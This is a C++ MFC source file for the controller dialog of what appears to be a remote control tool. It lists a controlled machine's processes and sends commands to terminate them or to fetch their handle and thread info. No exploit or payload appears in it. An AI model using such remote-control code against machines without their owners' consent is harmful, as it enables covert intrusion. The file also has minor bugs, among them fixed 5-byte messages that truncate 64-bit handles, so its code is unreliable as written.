// DlgProcessManager.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "DlgProcessManager.h"
#include "afxdialogex.h"
#include "Resource.h"

// CDlgProcessManager 对话框

IMPLEMENT_DYNAMIC(CDlgProcessManager, CDialogEx)

CDlgProcessManager::CDlgProcessManager(CWnd* pParent, _CIOCPServer* IOCPServer,
	PCONTEXT_OBJECT  ContextObject)
	: CDialogEx(IDD_DIALOG_PROCESS_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));

}

CDlgProcessManager::~CDlgProcessManager()
{
}

void CDlgProcessManager::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_DIALOG_PROCESS_MANAGER_SHOW, m_CListCtrl_Dialog_Process_Manager_Show);
}


BEGIN_MESSAGE_MAP(CDlgProcessManager, CDialogEx)
	ON_WM_CLOSE()
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_LIST_DIALOG_PROCESS_MANAGER_SHOW, &CDlgProcessManager::OnNMCustomdrawListDialogProcessManagerShow)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_DIALOG_PROCESS_MANAGER_SHOW, &CDlgProcessManager::OnNMRClickListDialogProcessManagerShow)
	ON_COMMAND(ID_MENU_DIALOG_PROCESS_MANAGER_LIST_SHOW_REFRESH, &CDlgProcessManager::OnMenuDialogProcessManagerListShowRefresh)
	ON_COMMAND(ID_MENU_DIALOG_PROCESS_MANAGER_TERMINATE_PROCESS, &CDlgProcessManager::OnMenuDialogProcessManagerTerminateProcess)
	ON_COMMAND(ID_MENU_DIALOG_PROCESS_MANAGER_SHOW_MODULE_INFO, &CDlgProcessManager::OnMenuDialogProcessManagerShowModuleInfo)
	ON_COMMAND(ID_MENU_DIALOG_PROCESS_MANAGER_SHOW_HANDLE_INFO, &CDlgProcessManager::OnMenuDialogProcessManagerShowHandleInfo)
END_MESSAGE_MAP()


// CDlgProcessManager 消息处理程序


BOOL CDlgProcessManager::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	SetIcon(m_hIcon, FALSE);

	//将客户端IP显示在标题栏
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int  ClientAddressLength = sizeof(ClientAddress);
	//得到连接的IP地址
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength);
	v1.Format("\\\\%s - 远程进程管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);        
	//设置对话框上的数据
	LOGFONT  Logfont;
	CFont*  v2 = m_CListCtrl_Dialog_Process_Manager_Show.GetFont();
	v2->GetLogFont(&Logfont);
	Logfont.lfHeight = Logfont.lfHeight*1.3;      //此处可以修改字体的高比例
	Logfont.lfWidth = Logfont.lfWidth*1.3;        //此处可以修改字体的宽比例
	CFont  v4;
	v4.CreateFontIndirect(&Logfont);
	m_CListCtrl_Dialog_Process_Manager_Show.SetFont(&v4);
	v4.Detach();

	//被控端传回的数据
	char*  BufferData = (char*)(m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(0));
	m_CListCtrl_Dialog_Process_Manager_Show.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	switch (BufferData[0])
	{
	case  CLIENT_PROCESS_MANAGER_REPLY:
	{
		m_CListCtrl_Dialog_Process_Manager_Show.InsertColumn(0, "PID", LVCFMT_LEFT, 40);
		m_CListCtrl_Dialog_Process_Manager_Show.InsertColumn(1, "进程镜像", LVCFMT_LEFT, 80);
		m_CListCtrl_Dialog_Process_Manager_Show.InsertColumn(2, "程序路径", LVCFMT_LEFT, 280);
		m_CListCtrl_Dialog_Process_Manager_Show.InsertColumn(3, "程序位数", LVCFMT_LEFT, 90);
		ShowProcessList();
		break;
	}
	default:
		break;
	}

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CDlgProcessManager::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_ContextObject->DialogHandle = NULL;
	m_ContextObject->DialogID = 0;
	CancelIo((HANDLE)m_ContextObject->ClientSocket);
	closesocket(m_ContextObject->ClientSocket);
	CDialogEx::OnClose();
}
void  CDlgProcessManager::ShowProcessList(void)
{
	char*  BufferData = (char*)(m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(1));
	char*  ProcessImageName = NULL;
	char*  ProcessFullPath = NULL;	
	char*  IsWow64 = NULL;
	DWORD  Offset = 0;
	CString v1;
	m_CListCtrl_Dialog_Process_Manager_Show.DeleteAllItems();
	int i;
	for (i = 0; Offset < m_ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength(); i++)
	{
		HANDLE* ProcessID = (HANDLE*)(BufferData + Offset);                      //进程ID
		ProcessImageName = BufferData + Offset + sizeof(HANDLE);                 //进程名
		ProcessFullPath = ProcessImageName + lstrlen(ProcessImageName) + 1;      //进程完整路径
		IsWow64 = ProcessFullPath + lstrlen(ProcessFullPath) + 1;               //进程位数

		v1.Format("%5u", *ProcessID);
		m_CListCtrl_Dialog_Process_Manager_Show.InsertItem(i, v1);

		m_CListCtrl_Dialog_Process_Manager_Show.SetItemText(i, 1, ProcessImageName);
		m_CListCtrl_Dialog_Process_Manager_Show.SetItemText(i, 2, ProcessFullPath);
		m_CListCtrl_Dialog_Process_Manager_Show.SetItemText(i, 3, IsWow64);
		//进程ID设为隐藏
		m_CListCtrl_Dialog_Process_Manager_Show.SetItemData(i, (DWORD_PTR)*ProcessID);
		//进入下一次循环
		Offset += sizeof(HANDLE) + lstrlen(ProcessImageName) + lstrlen(ProcessFullPath) + lstrlen(IsWow64) + 3;
	}

	v1.Format("程序个数 / %d", i);
	LVCOLUMN  v3;
	v3.mask = LVCF_TEXT;
	v3.pszText = v1.GetBuffer(0);
	v3.cchTextMax = v1.GetLength();
	m_CListCtrl_Dialog_Process_Manager_Show.SetColumn(3, &v3);
}

void CDlgProcessManager::OnNMCustomdrawListDialogProcessManagerShow(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMCUSTOMDRAW pNMCD = reinterpret_cast<LPNMCUSTOMDRAW>(pNMHDR);
	NMLVCUSTOMDRAW*  pLVCD = reinterpret_cast<NMLVCUSTOMDRAW*>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = CDRF_DODEFAULT;
	if (CDDS_PREPAINT == pLVCD->nmcd.dwDrawStage)
	{
		*pResult = CDRF_NOTIFYITEMDRAW;
	}
	else if (CDDS_ITEMPREPAINT == pLVCD->nmcd.dwDrawStage)
	{
		*pResult = CDRF_NOTIFYSUBITEMDRAW;
	}
	else if ((CDDS_ITEMPREPAINT | CDDS_SUBITEM) == pLVCD->nmcd.dwDrawStage)
	{
		COLORREF  NewTextColor, NewBackgroundColor;
		int  Item = static_cast<int>(pLVCD->nmcd.dwItemSpec);
		CString ProcessImageName = m_CListCtrl_Dialog_Process_Manager_Show.GetItemText(Item, 1);
		if (strcmp((const char*)ProcessImageName.GetBuffer(0), "explorer.exe") == 0)
		{
			NewTextColor = RGB(0, 0, 0);
			NewBackgroundColor = RGB(255, 0, 0);
		}
		else  if (strcmp((const char*)ProcessImageName.GetBuffer(0), "eDiary.exe") == 0)
		{
			NewTextColor = RGB(0, 0, 0);
			NewBackgroundColor = RGB(0, 255, 255);
		}
		else
		{
			NewTextColor = RGB(0, 0, 0);
			NewBackgroundColor = RGB(255, 255, 255);
		}
		pLVCD->clrText = NewTextColor;
		pLVCD->clrTextBk = NewBackgroundColor;
		*pResult = CDRF_DODEFAULT;
	}
	
}


void CDlgProcessManager::OnNMRClickListDialogProcessManagerShow(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CMenu   Menu;
	//加载菜单资源
	Menu.LoadMenu(IDR_MENU_DIALOG_PROCESS_MANAGER_LIST_SHOW);
	//获得鼠标位置
	CPoint  Point;
	GetCursorPos(&Point);
	SetForegroundWindow();           //设置当前窗口
	Menu.GetSubMenu(0)->TrackPopupMenu(TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
		Point.x, Point.y, this, NULL);

	*pResult = 0;
}

//刷新进程列表
void CDlgProcessManager::OnMenuDialogProcessManagerListShowRefresh()
{
	// TODO: 在此添加命令处理程序代码
	BYTE  IsToken = CLIENT_PROCESS_REFRESH_REQUIRE;
	m_IOCPServer->OnPreSending(m_ContextObject, &IsToken, 1);
}
void  CDlgProcessManager::WindowHandleIO(void)
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	switch (m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(0)[0])
	{
	case  CLIENT_PROCESS_MANAGER_REPLY:
	{
		ShowProcessList();
		break;
	}
	case  CLIENT_PROCESS_THREAD_INFO_SHOW_REPLY:
	{
		//创建一个远程消息对话框
		CDlgProcessShowThreadInfo*  DlgProcessShowThreadInfo = new CDlgProcessShowThreadInfo(this, m_IOCPServer, m_ContextObject);
		//设置父窗口为桌面
		DlgProcessShowThreadInfo->DoModal();
	//	DlgProcessShowThreadInfo->Create(IDD_DIALOG_PROCESS_SHOW_THREAD_INFO, GetDesktopWindow());
	//	DlgProcessShowThreadInfo->ShowWindow(SW_SHOW);
		break;
	}
	case  CLIENT_PROCESS_HANDLE_INFO_SHOW_REPLY:
	{
		//创建一个远程消息对话框
		CDlgProcessShowHandleInfo*  DlgProcessShowHandleInfo = new CDlgProcessShowHandleInfo(this, m_IOCPServer, m_ContextObject);
		//设置父窗口为桌面
		DlgProcessShowHandleInfo->DoModal();
		break;
	}
	}
}


void CDlgProcessManager::OnMenuDialogProcessManagerTerminateProcess()
{
	// TODO: 在此添加命令处理程序代码
	//从ListCtrl上的隐藏项中选中Context
	char  IsToken[10] = { 0 };
	IsToken[0] = CLIENT_PROCESS_TERMINATE_REQUIRE;
	POSITION  Position = m_CListCtrl_Dialog_Process_Manager_Show.GetFirstSelectedItemPosition();
	int  i = m_CListCtrl_Dialog_Process_Manager_Show.GetNextSelectedItem(Position);
	//获得该排的隐藏数据项
	HANDLE  SelectProcessID = (HANDLE)m_CListCtrl_Dialog_Process_Manager_Show.GetItemData(i);

	memcpy((IsToken + 1 ), &SelectProcessID, sizeof(HANDLE));
	m_IOCPServer->OnPreSending(m_ContextObject, (PBYTE)&IsToken, 5);
	
}


void CDlgProcessManager::OnMenuDialogProcessManagerShowModuleInfo()
{
	// TODO: 在此添加命令处理程序代码
	char  IsToken[10] = { 0 };
	IsToken[0] = CLIENT_PROCESS_THREAD_INFO_SHOW_REQUIRE;
	POSITION  Position = m_CListCtrl_Dialog_Process_Manager_Show.GetFirstSelectedItemPosition();
	int  i = m_CListCtrl_Dialog_Process_Manager_Show.GetNextSelectedItem(Position);
	//获得该排的隐藏数据项
	HANDLE  SelectProcessID = (HANDLE)m_CListCtrl_Dialog_Process_Manager_Show.GetItemData(i);

	memcpy((IsToken + 1), &SelectProcessID, sizeof(HANDLE));
	m_IOCPServer->OnPreSending(m_ContextObject, (PBYTE)&IsToken, 5);
}


void CDlgProcessManager::OnMenuDialogProcessManagerShowHandleInfo()
{
	// TODO: 在此添加命令处理程序代码
	char  IsToken[10] = { 0 };
	IsToken[0] = CLIENT_PROCESS_HANDLE_INFO_SHOW_REQUIRE;
	POSITION  Position = m_CListCtrl_Dialog_Process_Manager_Show.GetFirstSelectedItemPosition();
	int  i = m_CListCtrl_Dialog_Process_Manager_Show.GetNextSelectedItem(Position);
	//获得该排的隐藏数据项
	HANDLE  SelectProcessID = (HANDLE)m_CListCtrl_Dialog_Process_Manager_Show.GetItemData(i);

	memcpy((IsToken + 1), &SelectProcessID, sizeof(HANDLE));
	m_IOCPServer->OnPreSending(m_ContextObject, (PBYTE)&IsToken, 5);
}
